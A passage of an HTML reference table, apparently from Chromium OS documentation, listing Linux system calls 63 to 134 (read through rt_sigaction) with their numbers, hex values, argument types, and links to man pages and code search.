</tr>
<tr>
<td align="center">63</td>
<td>read</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/read.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*read">cs/</a></td>
<td align="center">0x3f</td>
<td>unsigned int fd</td>
<td>char *buf</td>
<td>size_t count</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">64</td>
<td>write</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/write.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*write">cs/</a></td>
<td align="center">0x40</td>
<td>unsigned int fd</td>
<td>const char *buf</td>
<td>size_t count</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">65</td>
<td>readv</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/readv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readv">cs/</a></td>
<td align="center">0x41</td>
<td>unsigned long fd</td>
<td>const struct iovec *vec</td>
<td>unsigned long vlen</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">66</td>
<td>writev</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/writev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*writev">cs/</a></td>
<td align="center">0x42</td>
<td>unsigned long fd</td>
<td>const struct iovec *vec</td>
<td>unsigned long vlen</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">67</td>
<td>pread64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pread64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pread64">cs/</a></td>
<td align="center">0x43</td>
<td>unsigned int fd</td>
<td>char *buf</td>
<td>size_t count</td>
<td>loff_t pos</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">68</td>
<td>pwrite64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pwrite64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwrite64">cs/</a></td>
<td align="center">0x44</td>
<td>unsigned int fd</td>
<td>const char *buf</td>
<td>size_t count</td>
<td>loff_t pos</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">69</td>
<td>preadv</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/preadv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*preadv">cs/</a></td>
<td align="center">0x45</td>
<td>unsigned long fd</td>
<td>const struct iovec *vec</td>
<td>unsigned long vlen</td>
<td>unsigned long pos_l</td>
<td>unsigned long pos_h</td>
<td>-</td>
</tr>
<tr>
<td align="center">70</td>
<td>pwritev</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pwritev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwritev">cs/</a></td>
<td align="center">0x46</td>
<td>unsigned long fd</td>
<td>const struct iovec *vec</td>
<td>unsigned long vlen</td>
<td>unsigned long pos_l</td>
<td>unsigned long pos_h</td>
<td>-</td>
</tr>
<tr>
<td align="center">71</td>
<td>sendfile</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sendfile.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendfile">cs/</a></td>
<td align="center">0x47</td>
<td>int out_fd</td>
<td>int in_fd</td>
<td>off_t *offset</td>
<td>size_t count</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">72</td>
<td>pselect6</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pselect6.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pselect6">cs/</a></td>
<td align="center">0x48</td>
<td>int</td>
<td>fd_set *</td>
<td>fd_set *</td>
<td>fd_set *</td>
<td>struct __kernel_timespec *</td>
<td>void *</td>
</tr>
<tr>
<td align="center">73</td>
<td>ppoll</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/ppoll.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ppoll">cs/</a></td>
<td align="center">0x49</td>
<td>struct pollfd *</td>
<td>unsigned int</td>
<td>struct __kernel_timespec *</td>
<td>const sigset_t *</td>
<td>size_t</td>
<td>-</td>
</tr>
<tr>
<td align="center">74</td>
<td>signalfd4</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/signalfd4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*signalfd4">cs/</a></td>
<td align="center">0x4a</td>
<td>int ufd</td>
<td>sigset_t *user_mask</td>
<td>size_t sizemask</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">75</td>
<td>vmsplice</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/vmsplice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vmsplice">cs/</a></td>
<td align="center">0x4b</td>
<td>int fd</td>
<td>const struct iovec *iov</td>
<td>unsigned long nr_segs</td>
<td>unsigned int flags</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">76</td>
<td>splice</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/splice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*splice">cs/</a></td>
<td align="center">0x4c</td>
<td>int fd_in</td>
<td>loff_t *off_in</td>
<td>int fd_out</td>
<td>loff_t *off_out</td>
<td>size_t len</td>
<td>unsigned int flags</td>
</tr>
<tr>
<td align="center">77</td>
<td>tee</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/tee.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tee">cs/</a></td>
<td align="center">0x4d</td>
<td>int fdin</td>
<td>int fdout</td>
<td>size_t len</td>
<td>unsigned int flags</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">78</td>
<td>readlinkat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/readlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readlinkat">cs/</a></td>
<td align="center">0x4e</td>
<td>int dfd</td>
<td>const char *path</td>
<td>char *buf</td>
<td>int bufsiz</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">79</td>
<td>newfstatat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/newfstatat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*newfstatat">cs/</a></td>
<td align="center">0x4f</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>struct stat *statbuf</td>
<td>int flag</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">80</td>
<td>fstat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstat">cs/</a></td>
<td align="center">0x50</td>
<td>unsigned int fd</td>
<td>struct __old_kernel_stat *statbuf</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">81</td>
<td>sync</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sync">cs/</a></td>
<td align="center">0x51</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">82</td>
<td>fsync</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fsync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fsync">cs/</a></td>
<td align="center">0x52</td>
<td>unsigned int fd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">83</td>
<td>fdatasync</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fdatasync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fdatasync">cs/</a></td>
<td align="center">0x53</td>
<td>unsigned int fd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">84</td>
<td>sync_file_range</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sync_file_range.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sync_file_range">cs/</a></td>
<td align="center">0x54</td>
<td>int fd</td>
<td>loff_t offset</td>
<td>loff_t nbytes</td>
<td>unsigned int flags</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">85</td>
<td>timerfd_create</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_create">cs/</a></td>
<td align="center">0x55</td>
<td>int clockid</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">86</td>
<td>timerfd_settime</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_settime">cs/</a></td>
<td align="center">0x56</td>
<td>int ufd</td>
<td>int flags</td>
<td>const struct __kernel_itimerspec *utmr</td>
<td>struct __kernel_itimerspec *otmr</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">87</td>
<td>timerfd_gettime</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_gettime">cs/</a></td>
<td align="center">0x57</td>
<td>int ufd</td>
<td>struct __kernel_itimerspec *otmr</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">88</td>
<td>utimensat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/utimensat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utimensat">cs/</a></td>
<td align="center">0x58</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>struct __kernel_timespec *utimes</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">89</td>
<td>acct</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/acct.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*acct">cs/</a></td>
<td align="center">0x59</td>
<td>const char *name</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">90</td>
<td>capget</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/capget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*capget">cs/</a></td>
<td align="center">0x5a</td>
<td>cap_user_header_t header</td>
<td>cap_user_data_t dataptr</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">91</td>
<td>capset</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/capset.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*capset">cs/</a></td>
<td align="center">0x5b</td>
<td>cap_user_header_t header</td>
<td>const cap_user_data_t data</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">92</td>
<td>personality</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/personality.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*personality">cs/</a></td>
<td align="center">0x5c</td>
<td>unsigned int personality</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">93</td>
<td>exit</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/exit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*exit">cs/</a></td>
<td align="center">0x5d</td>
<td>int error_code</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">94</td>
<td>exit_group</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/exit_group.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*exit_group">cs/</a></td>
<td align="center">0x5e</td>
<td>int error_code</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">95</td>
<td>waitid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/waitid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*waitid">cs/</a></td>
<td align="center">0x5f</td>
<td>int which</td>
<td>pid_t pid</td>
<td>struct siginfo *infop</td>
<td>int options</td>
<td>struct rusage *ru</td>
<td>-</td>
</tr>
<tr>
<td align="center">96</td>
<td>set_tid_address</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/set_tid_address.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_tid_address">cs/</a></td>
<td align="center">0x60</td>
<td>int *tidptr</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">97</td>
<td>unshare</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/unshare.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unshare">cs/</a></td>
<td align="center">0x61</td>
<td>unsigned long unshare_flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">98</td>
<td>futex</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/futex.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*futex">cs/</a></td>
<td align="center">0x62</td>
<td>u32 *uaddr</td>
<td>int op</td>
<td>u32 val</td>
<td>const struct __kernel_timespec *utime</td>
<td>u32 *uaddr2</td>
<td>u32 val3</td>
</tr>
<tr>
<td align="center">99</td>
<td>set_robust_list</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/set_robust_list.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_robust_list">cs/</a></td>
<td align="center">0x63</td>
<td>struct robust_list_head *head</td>
<td>size_t len</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">100</td>
<td>get_robust_list</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/get_robust_list.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_robust_list">cs/</a></td>
<td align="center">0x64</td>
<td>int pid</td>
<td>struct robust_list_head * *head_ptr</td>
<td>size_t *len_ptr</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">101</td>
<td>nanosleep</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/nanosleep.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nanosleep">cs/</a></td>
<td align="center">0x65</td>
<td>struct __kernel_timespec *rqtp</td>
<td>struct __kernel_timespec *rmtp</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">102</td>
<td>getitimer</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getitimer.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getitimer">cs/</a></td>
<td align="center">0x66</td>
<td>int which</td>
<td>struct __kernel_old_itimerval *value</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">103</td>
<td>setitimer</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setitimer.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setitimer">cs/</a></td>
<td align="center">0x67</td>
<td>int which</td>
<td>struct __kernel_old_itimerval *value</td>
<td>struct __kernel_old_itimerval *ovalue</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">104</td>
<td>kexec_load</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/kexec_load.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kexec_load">cs/</a></td>
<td align="center">0x68</td>
<td>unsigned long entry</td>
<td>unsigned long nr_segments</td>
<td>struct kexec_segment *segments</td>
<td>unsigned long flags</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">105</td>
<td>init_module</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/init_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*init_module">cs/</a></td>
<td align="center">0x69</td>
<td>void *umod</td>
<td>unsigned long len</td>
<td>const char *uargs</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">106</td>
<td>delete_module</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/delete_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*delete_module">cs/</a></td>
<td align="center">0x6a</td>
<td>const char *name_user</td>
<td>unsigned int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">107</td>
<td>timer_create</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_create">cs/</a></td>
<td align="center">0x6b</td>
<td>clockid_t which_clock</td>
<td>struct sigevent *timer_event_spec</td>
<td>timer_t * created_timer_id</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">108</td>
<td>timer_gettime</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_gettime">cs/</a></td>
<td align="center">0x6c</td>
<td>timer_t timer_id</td>
<td>struct __kernel_itimerspec *setting</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">109</td>
<td>timer_getoverrun</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_getoverrun.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_getoverrun">cs/</a></td>
<td align="center">0x6d</td>
<td>timer_t timer_id</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">110</td>
<td>timer_settime</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_settime">cs/</a></td>
<td align="center">0x6e</td>
<td>timer_t timer_id</td>
<td>int flags</td>
<td>const struct __kernel_itimerspec *new_setting</td>
<td>struct __kernel_itimerspec *old_setting</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">111</td>
<td>timer_delete</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_delete.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_delete">cs/</a></td>
<td align="center">0x6f</td>
<td>timer_t timer_id</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">112</td>
<td>clock_settime</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_settime">cs/</a></td>
<td align="center">0x70</td>
<td>clockid_t which_clock</td>
<td>const struct __kernel_timespec *tp</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">113</td>
<td>clock_gettime</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_gettime">cs/</a></td>
<td align="center">0x71</td>
<td>clockid_t which_clock</td>
<td>struct __kernel_timespec *tp</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">114</td>
<td>clock_getres</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_getres.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_getres">cs/</a></td>
<td align="center">0x72</td>
<td>clockid_t which_clock</td>
<td>struct __kernel_timespec *tp</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">115</td>
<td>clock_nanosleep</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_nanosleep.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_nanosleep">cs/</a></td>
<td align="center">0x73</td>
<td>clockid_t which_clock</td>
<td>int flags</td>
<td>const struct __kernel_timespec *rqtp</td>
<td>struct __kernel_timespec *rmtp</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">116</td>
<td>syslog</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/syslog.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*syslog">cs/</a></td>
<td align="center">0x74</td>
<td>int type</td>
<td>char *buf</td>
<td>int len</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">117</td>
<td>ptrace</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ptrace">cs/</a></td>
<td align="center">0x75</td>
<td>long request</td>
<td>long pid</td>
<td>unsigned long addr</td>
<td>unsigned long data</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">118</td>
<td>sched_setparam</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setparam.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setparam">cs/</a></td>
<td align="center">0x76</td>
<td>pid_t pid</td>
<td>struct sched_param *param</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">119</td>
<td>sched_setscheduler</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setscheduler.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setscheduler">cs/</a></td>
<td align="center">0x77</td>
<td>pid_t pid</td>
<td>int policy</td>
<td>struct sched_param *param</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">120</td>
<td>sched_getscheduler</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getscheduler.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getscheduler">cs/</a></td>
<td align="center">0x78</td>
<td>pid_t pid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">121</td>
<td>sched_getparam</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getparam.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getparam">cs/</a></td>
<td align="center">0x79</td>
<td>pid_t pid</td>
<td>struct sched_param *param</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">122</td>
<td>sched_setaffinity</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setaffinity.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setaffinity">cs/</a></td>
<td align="center">0x7a</td>
<td>pid_t pid</td>
<td>unsigned int len</td>
<td>unsigned long *user_mask_ptr</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">123</td>
<td>sched_getaffinity</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getaffinity.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getaffinity">cs/</a></td>
<td align="center">0x7b</td>
<td>pid_t pid</td>
<td>unsigned int len</td>
<td>unsigned long *user_mask_ptr</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">124</td>
<td>sched_yield</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_yield.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_yield">cs/</a></td>
<td align="center">0x7c</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">125</td>
<td>sched_get_priority_max</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_get_priority_max.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_get_priority_max">cs/</a></td>
<td align="center">0x7d</td>
<td>int policy</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">126</td>
<td>sched_get_priority_min</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_get_priority_min.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_get_priority_min">cs/</a></td>
<td align="center">0x7e</td>
<td>int policy</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">127</td>
<td>sched_rr_get_interval</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_rr_get_interval.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_rr_get_interval">cs/</a></td>
<td align="center">0x7f</td>
<td>pid_t pid</td>
<td>struct __kernel_timespec *interval</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">128</td>
<td>restart_syscall</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/restart_syscall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*restart_syscall">cs/</a></td>
<td align="center">0x80</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">129</td>
<td>kill</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/kill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kill">cs/</a></td>
<td align="center">0x81</td>
<td>pid_t pid</td>
<td>int sig</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">130</td>
<td>tkill</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/tkill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tkill">cs/</a></td>
<td align="center">0x82</td>
<td>pid_t pid</td>
<td>int sig</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">131</td>
<td>tgkill</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/tgkill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tgkill">cs/</a></td>
<td align="center">0x83</td>
<td>pid_t tgid</td>
<td>pid_t pid</td>
<td>int sig</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">132</td>
<td>sigaltstack</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sigaltstack.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigaltstack">cs/</a></td>
<td align="center">0x84</td>
<td>const struct sigaltstack *uss</td>
<td>struct sigaltstack *uoss</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">133</td>
<td>rt_sigsuspend</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigsuspend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigsuspend">cs/</a></td>
<td align="center">0x85</td>
<td>sigset_t *unewset</td>
<td>size_t sigsetsize</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">134</td>
<td>rt_sigaction</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigaction.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigaction">cs/</a></td>
